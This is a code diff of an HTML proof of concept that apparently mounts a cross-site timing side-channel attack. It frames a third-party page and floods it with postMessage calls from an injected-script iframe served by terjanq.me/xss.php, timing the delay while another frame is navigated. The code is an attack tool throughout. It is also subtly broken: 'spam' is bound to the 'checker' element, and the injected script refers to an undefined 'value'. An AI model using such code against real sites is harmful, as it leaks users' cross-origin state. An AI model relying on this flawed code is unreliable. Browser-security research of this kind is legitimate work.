@@ -1,17 +1,12 @@
 <body>
     <iframe id="target" src="https://ndevtk.github.io/cross-site/"></iframe>
     <iframe id="checker" src="https://ndevtk.github.io/cross-site/"></iframe>
+    <iframe id="spam" src="https://terjanq.me/xss.php?js=onmessage=function(event){for(let i=80000;i--;)parent[0].postMessage(value,'*');}"></iframe>
     <script>
       let target = document.getElementById('target');
       let checker = document.getElementById('checker');
+      let spam = document.getElementById('checker');
 
-      function worker_function() {
-          self.onmessage = function (event) {
-              for(let i=80000; i--;) event.source.target.contentWindow.postMessage(value, '*');
-          } 
-      }
-
-      const worker = new Worker(URL.createObjectURL(new Blob([`(${worker_function})()`], {type: "text/javascript"})));
 
       function time(value) {
         return new Promise(resolve => {
@@ -19,7 +14,7 @@
             resolve(performance.now() - start);
           };
           let start = performance.now();
-          worker.postMessage("");
+          spam.contentWindow.postMessage("");
           checker.contentWindow.location = "https://ndevtk.github.io/cross-site/";
         });
       }
